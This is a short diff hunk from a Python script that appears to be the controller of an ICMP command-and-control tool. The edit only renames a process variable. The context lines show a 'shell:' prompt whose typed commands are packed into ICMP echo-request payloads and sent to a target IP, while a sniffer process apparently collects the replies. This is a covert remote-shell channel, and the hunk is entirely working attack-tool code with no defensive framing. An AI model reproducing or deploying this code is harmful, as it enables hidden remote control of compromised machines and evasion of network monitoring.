@@ -32,21 +32,21 @@ def shell(pkt):
         pass
 
 def main():
-    p = Process(target=sniffer)
-    p.start()
+    sniffing = Process(target=sniffer)
+    sniffing.start()
     print("[+]ICMP C2 started!")
     while True:
         icmpshell = input("shell: ")
         if icmpshell == 'exit':
             print("[+]Stopping ICMP C2...")
-            p.terminate()
+            sniffing.terminate()
             break
         elif icmpshell == '':
             pass
         else:
             payload = (IP(dst=args.destination_ip, ttl=ttl)/ICMP(type=8,id=icmp_id)/Raw(load=icmpshell))
             sr(payload, timeout=0, verbose=0)
-    p.join()
+    sniffing.join()
 
 if __name__ == "__main__":
     main()
